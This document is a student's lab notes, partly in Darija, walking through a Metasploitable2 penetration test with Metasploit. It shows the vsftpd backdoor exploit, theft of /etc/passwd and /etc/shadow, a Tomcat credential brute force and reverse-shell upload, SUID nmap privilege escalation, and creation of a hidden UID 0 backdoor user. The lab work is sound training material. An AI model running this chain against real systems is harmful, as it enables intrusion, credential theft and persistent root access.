---
title: "Metasploitable Exploitation Guide"
categories:
  - Cybersecurity
tags:
  - vulnerability-scanning
  - exploit-development
  - penetration-testing
---

awal haja active directory 


# CLASS 1 :
nmap 
berpsuit 
wireshark 
penteste kill chaine 
metasploite 

attack 3la windows10 specific version khdina fiha l reverse shell 







# CLASS 5 : 
## Metasploit Terminal Session  - Commands & Explanation

---
## ðŸ” **PHASE 1

### Target Connectivity Test

```bash
ping 192.168.1.50
```

**What it does:** Tests if target (Metasploitable2) is reachable

- **Result:** âœ… Target is alive (6 packets received, 0% loss)

---

## ðŸ—„ï¸ **PHASE 2: Database Setup**

### Start PostgreSQL

```bash
service postgresql start
service postgresql status
```

**What it does:** Starts database for Metasploit

### Initialize Metasploit Database

```bash
sudo msfdb init
```

**What it does:** Creates database for storing scan results and exploits

- Created user 'msf'
- Created databases 'msf' and 'msf_test'

---

## ðŸš€ **PHASE 3: Metasploit Console Launch**

### Start Metasploit

```bash
msfconsole
```

**What it does:** Opens the Metasploit Framework console

- Loaded 2,547 exploits, 1,309 auxiliary modules

---

## ðŸŽ¯ **PHASE 4: FTP Exploit (vsftpd Backdoor)**

### Search for Exploit

```bash
msf > search vsftpd
```

**What it does:** Searches for vsftpd vulnerabilities **Found:** vsftpd 2.3.4 backdoor exploit

### Configure & Execute FTP Exploit

```bash
msf > use 1                    # Select exploit
msf > set rhosts 192.168.1.50  # Set target IP
msf > run                       # Execute exploit
```

**Result:**

- âœ… **Backdoor triggered!**
- Got ROOT shell: `uid=0(root) gid=0(root)`
- Created Session 1 and Session 2

### Upgrade to Meterpreter

```bash
msf > sessions -l              # List active sessions
msf > sessions -u 2            # Upgrade session 2 to meterpreter
msf > sessions -i 3            # Interact with meterpreter session
```

**What this does:** Converts basic shell to advanced Meterpreter session with more features

### Meterpreter Commands

```bash
meterpreter > ifconfig         # Check target's network config
meterpreter > download /etc/passwd    # Steal password file
meterpreter > download /etc/shadow    # Steal shadow file (hashed passwords)
meterpreter > exit             # Exit meterpreter
```

**What was stolen:**

- `/etc/passwd` - User account info
- `/etc/shadow` - Password hashes

---

## ðŸŒ **PHASE 5:Metasploitable 2 Tomcat Web Server Attack**

### Search for Tomcat Exploits

```bash
msf > search tomcat mgr
```

**Found:** Tomcat Manager upload exploit

### Brute Force Tomcat Login

```bash
msf > use 9                           # Tomcat login scanner
msf > set rhost 192.168.1.50
msf > set RPORT 8180                  # Tomcat port
msf > run
```

**Result:**

- âœ… **Found credentials: tomcat:tomcat**
- Tried 200+ password combinations
- Success on default credentials!

### Exploit Tomcat Manager

```bash
msf > use 5                           # Tomcat upload exploit
msf > set RHOSTS 192.168.1.50
msf > set RPORT 8180
msf > set payload 14                  # Java reverse shell
msf > set LHOST 192.168.1.100        # Your Kali IP
msf > set HttpPassword tomcat         # Credentials found earlier
msf > set HttpUsername tomcat
msf > run
```

**What this does:**

- Uploads malicious JSP file to Tomcat
- Gets shell as `tomcat55` user
- Opens Session 4

---

## ðŸ”“ **PHASE 6: Privilege Escalation**

### Find SUID Binaries

```bash
tomcat55@metasploitable:/$ find / -perm -u=s -type f 2>/dev/null
```

**What this does:** Finds files with SUID bit (run as owner) **Key findings:**

- `/usr/bin/sudo` - Can run commands as root
- `/usr/bin/nmap` - **VULNERABLE!** Old nmap with interactive mode

### Exploit nmap for Root Access

```bash
tomcat55@metasploitable:/$ nmap --interactive
nmap> !sh
```

**What this does:**

- Old nmap (v4.53) has interactive mode
- Can execute shell commands
- Shell runs as ROOT because nmap has SUID bit!

### Got Root Shell!

```bash
sh-3.2# whoami
root
```

---

## ðŸŽ­ **PHASE 7: Persistence & Backdoor Creation**

### Create Backdoor User

```bash
sh-3.2# useradd -u 0 -o -g 0 ramaqs
```

**What this does:** Creates new user "ramaqs" with UID 0 (ROOT privileges!)

- `-u 0` = User ID 0 (root)
- `-o` = Allow duplicate UID
- `-g 0` = Group ID 0 (root group)

### Set Backdoor Password

```bash
sh-3.2# echo "ramaqs:149059" | chpasswd
```

**What this does:** Sets password "149059" for ramaqs user



This is a **complete penetration testing workflow** from reconnaissance to maintaining access!
